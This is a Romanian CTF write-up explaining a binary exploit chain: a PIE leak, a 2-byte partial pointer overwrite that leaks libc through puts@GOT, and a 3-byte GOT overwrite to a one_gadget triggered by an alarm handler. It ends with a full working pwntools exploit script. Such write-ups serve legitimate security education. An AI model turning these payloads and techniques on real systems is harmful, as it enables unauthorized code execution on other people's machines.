<h1>Explicarea exploitului (PIE leak → libc leak → GOT overwrite → one_gadget pe alarm)</h1>

<h1>Context: ce ne arată codul vulnerabil</h1>

Funcția principală vulnerabilă este <code>FUN_00101265</code>. Acolo se întâmplă trei lucruri importante:

<ul>
  <li>îți dă un <b>leak de PIE</b>: <code>printf("welcome, gift for today: %p\n", FUN_00101265);</code></li>
  <li>îți oferă un <b>write controlat de 2 bytes</b> asupra unui pointer (<code>local_10</code>) printr-un <code>read()</code> puțin mai mare decât bufferul</li>
  <li>îți oferă un <b>write controlat prin <code>fgets</code></b> către o adresă aleasă (cu o verificare slabă), ceea ce devine perfect pentru un <b>partial GOT overwrite</b></li>
</ul>

<h1>Vulnerabilitatea #1: overflow mic + overwrite de 2 bytes pe pointer (stage 1)</h1>

În <code>FUN_00101265</code>:

<ul>
  <li><code>char local_48[56];</code> (adică 56 bytes)</li>
  <li><code>read(0, local_48, 0x3a);</code> (adică 58 bytes)</li>
</ul>

Asta înseamnă că <b>se citesc 2 bytes peste buffer</b>. Imediat după buffer, în stack, se află de obicei variabile locale / padding / pointeri. În cazul tău, ținta e <code>local_10</code> (un pointer inițial către un string din <code>.rodata</code>):

<pre>
local_10 = "quite interesting stuff you're saying";
...
puts(local_10);
</pre>

Prin overflow-ul de 2 bytes, tu nu poți schimba tot pointerul (8 bytes), dar poți schimba <b>ultimii 2 bytes</b> (low 16 bits). Asta se numește <b>partial pointer overwrite</b>.

<h1>Cum folosești asta: retarget local_10 → puts@GOT pentru leak de libc</h1>

Ideea: dacă îl faci pe <code>local_10</code> să pointeze către <code>puts@GOT</code>, atunci linia:

<pre>
puts(local_10);
</pre>

devine efectiv:

<pre>
puts(puts@GOT);
</pre>

iar <code>puts</code> va printa bytes de la acea adresă (adică adresa reală a lui <code>puts</code> din libc, rezolvată din GOT). Asta îți dă un <b>libc leak</b>.

În scriptul tău, exact asta se face:

<ul>
  <li>calculezi <code>pie_base</code> din leak-ul inițial</li>
  <li>calculezi <code>puts_got = pie_base + elf.got["puts"]</code></li>
  <li>iei <code>low2 = puts_got & 0xffff</code> și îl scrii peste low 2 bytes ai pointerului</li>
</ul>

Payload-ul tău stage 1 are layout fix (newline-ul contează pentru cum ajunge input-ul în stack):

<pre>
"A"*10 + "\n" + "A"*45 + p16(low2)
</pre>

Astfel, <code>puts(local_10)</code> îți returnează o linie ce conține pointerul <code>puts</code> din libc, pe care îl convertești cu <code>u64(...)</code> → <code>libc_puts</code>, apoi:

<pre>
libc_base = libc_puts - libc.symbols["puts"]
</pre>

<h1>Vulnerabilitatea #2: write către o adresă aleasă prin scanf + fgets (stage 2)</h1>

După leak, codul face:

<pre>
__isoc23_scanf("%p", &local_50);
if (printf < local_50) { ... syscall(); }
fgets((char *)local_50, 5, stdin);
</pre>

Interpretare:

<ul>
  <li><code>scanf("%p", &local_50)</code> îți permite să setezi <b>un pointer arbitrar</b> (adresa unde se va scrie).</li>
  <li>verificarea <code>if (printf < local_50)</code> e o “protecție” slabă: vrea să te oprească să scrii prea “sus” în memorie, dar în practică îți lasă spațiu pentru a targeta zone sub/în jurul segmentelor utile (în challenge-urile de genul ăsta, fix asta e intenția).</li>
  <li><code>fgets(ptr, 5, stdin)</code> scrie până la 4 bytes + NULL terminator. Deci ai practic o scriere mică, controlată.</li>
</ul>

Asta e perfect pentru un <b>partial GOT overwrite</b>.

<h1>Stage 2: partial GOT overwrite puts@GOT → one_gadget (DOAR 3 bytes)</h1>

Tu trimiți mai întâi adresa țintă ca hex:

<pre>
p.sendline(hex(puts_got).encode())
</pre>

Asta setează <code>local_50 = puts_got</code>. Apoi, în loc să trimiți 4 bytes (care ar umple exact cât scrie <code>fgets</code>), tu trimiți <b>doar 3 bytes</b> din adresa one_gadget-ului:

<pre>
p.send(p64(one_gadget)[:3])
</pre>

De ce e important “doar 3 bytes”?

<ul>
  <li> daca am scrie si al  4 lea Byte atunci s ar aplica terminatorul NULL + programul ar da exit() si s ar inchide </li>
</ul>



<h1>De ce funcționează trigger-ul: alarm / handler-ul de timeout</h1>

A doua funcție (<code>FUN_001011b9</code>) setează:

<ul>
  <li><code>signal(SIGALRM, FUN_001011b9)</code></li>
  <li><code>alarm(100)</code></li>
</ul>

Deci după ~100 secunde, se execută handler-ul:

<pre>
puts("challenge timed out");
syscall();
...
</pre>

Tu ți-ai setat <code>puts@GOT</code> să pointeze către <code>one_gadget</code>. Asta înseamnă că atunci când handler-ul cheamă:

<pre>
puts("challenge timed out");
</pre>

în realitate se execută:

<pre>
one_gadget(...)
</pre>

și obții execuție de cod (de obicei shell) exact la timeout.

<h1>Rezumat flow exploit (exact logica ta)</h1>

<ol>
  <li><b>Leakezi PIE</b> din mesajul de welcome: primești adresa lui <code>FUN_00101265</code>, scazi <code>FUN_OFF</code> → <code>pie_base</code>.</li>
  <li><b>Calculezi puts@GOT</b> din PIE: <code>puts_got = pie_base + elf.got["puts"]</code>.</li>
  <li><b>Stage 1 (2 bytes)</b>: overflow mic care modifică low2 bytes ai lui <code>local_10</code> ca să pointeze spre <code>puts@GOT</code>.</li>
  <li><b>Leakezi libc</b>: acum <code>puts(local_10)</code> îți printează adresa reală a lui <code>puts</code> din libc → calculezi <code>libc_base</code>.</li>
  <li><b>Stage 2 (GOT overwrite)</b>: trimiți adresa <code>puts_got</code> ca destinație pentru <code>fgets</code>, apoi scrii <b>3 bytes</b> din <code>one_gadget</code> peste <code>puts@GOT</code>.</li>
  <li><b>Trigger</b>: după 100 secunde, <code>alarm</code> declanșează handler-ul care apelează <code>puts</code> → acum e one_gadget → shell.</li>
</ol>

<h1>Observații utile pentru writeup</h1>

<ul>
  <li>Stage 1 e un exemplu clasic de <b>partial pointer overwrite</b> (doar 2 bytes) folosit ca să redirecționezi un pointer “safe” din stack către o locație utilă (GOT) pentru leak.</li>
  <li>Stage 2 e un exemplu de <b>partial GOT overwrite</b> (3 bytes) folosit ca să redirecționezi o funcție importată către un gadget din libc.</li>
  <li>Trigger-ul prin <b>alarm</b> e foarte “curat”: nu trebuie să mai interacționezi cu programul după overwrite; doar aștepți handler-ul.</li>
</ul>


<h1> Script de Exploatare </h1>

```

from pwn import *

elf  = ELF("./chall")
libc = ELF("./libc.so.6")
context.binary = elf  # keep checksec + packing defaults

# ----------------- CONSTANTS -----------------
HOST = "127.0.0.1"
PORT = 7001

FUN_OFF            = 0x1265   # leaked_function_addr - pie_base
ONE_GADGET_OFFSET  = 0xef4ce  # libc_base + this = one_gadget

# Stage 1 layout (keep EXACT same logic as your original payload)
STAGE1_A1_LEN = 10
STAGE1_A2_LEN = 45

# ---------------------------------------------------
# 1) CONNECT & LEAK PIE
# ---------------------------------------------------
p = remote(HOST, PORT)

welcome = p.recvline()
leak = int(welcome.split(b": ")[1], 16)   # "....: 0x...."
pie_base = leak - FUN_OFF

log.info(f"leak       = {hex(leak)}")
log.info(f"PIE base   = {hex(pie_base)}")

puts_got = pie_base + elf.got["puts"]
log.info(f"puts@GOT   = {hex(puts_got)}")

# ---------------------------------------------------
# 2) LEAK LIBC (stage 1) – 2-byte partial overwrite to retarget local_10 -> puts@GOT
# ---------------------------------------------------
low2 = puts_got & 0xFFFF
two_bytes = p16(low2)

payload  = b"A" * STAGE1_A1_LEN
payload += b"\n"
payload += b"A" * STAGE1_A2_LEN
payload += two_bytes

p.sendline(payload)

# This puts(local_10) should now behave like puts(puts@GOT) and leak a libc address
line = p.recvline().rstrip(b"\n")
print("Got line:", line)

libc_puts = u64(line.ljust(8, b"\x00"))
print("leaked puts@libc:", hex(libc_puts))

libc_base = libc_puts - libc.symbols["puts"]
log.info(f"libc base  = {hex(libc_base)}")

# ---------------------------------------------------
# 3) GOT OVERWRITE (stage 2) – 3-byte partial overwrite puts@GOT -> one_gadget
# ---------------------------------------------------
# Protocol: send address as hex, then 3 raw bytes
p.sendline(hex(puts_got).encode())

one_gadget = libc_base + ONE_GADGET_OFFSET
log.info(f"one_gadget = {hex(one_gadget)}")

p.send(p64(one_gadget)[:3])

# ---------------------------------------------------
# 4) INTERACTIVE
# ---------------------------------------------------
p.interactive()

# debugging purposes
print("pie_base   =", hex(pie_base))
print("puts_got   =", hex(puts_got))
print("libc_puts  =", hex(libc_puts))
print("libc_base  =", hex(libc_base))
print("one_gadget =", hex(one_gadget))
```

